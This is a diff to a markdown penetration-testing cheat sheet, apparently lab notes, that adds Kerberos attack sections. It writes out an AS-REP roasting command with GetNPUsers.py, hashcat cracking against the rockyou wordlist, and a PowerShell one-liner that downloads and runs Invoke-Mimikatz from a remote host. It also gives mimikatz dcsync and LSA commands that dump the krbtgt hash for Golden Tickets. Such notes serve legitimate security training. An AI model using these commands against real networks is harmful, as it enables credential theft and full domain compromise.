@@ -174,14 +174,35 @@ A protocol that defines how clients interact with a network authentication servi
 
 ### Kerberos Attacks
 
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/f6d5221a8576125a07f42e08c591298335fef256/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting
+```
+
 #### Pass the Tickets
 
 #### Kerberoasting
 
+#### ASREP Roasting
+
+If you have a service account username but no passowrd and the user does not have pre-authentication enabled (unlikely in real world but possible for some services) an AS-REP roast can be performed.
+```
+python GetNPUsers.py htb.local/svc-name -dc-ip 10.10.10.10 >> asrep.hashes
+
+Clean up file then
+
+hashcat -m 18200 --force -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
+```
 #### Silver Tickets
 
 #### Golden Tickets
+```
+Invoke-Expression (New-Object Net.Webclient).downloadstring('http://10.10.10.10:8000/Invoke-Mimikatz.ps1')
 
+Either dsync or lsa dump for krbtgt NTLM hash
+
+lsadump::dcsync /user:krbtgt
+lsadump::lsa /inject /name:krbtgt
+```
 ---
 
 
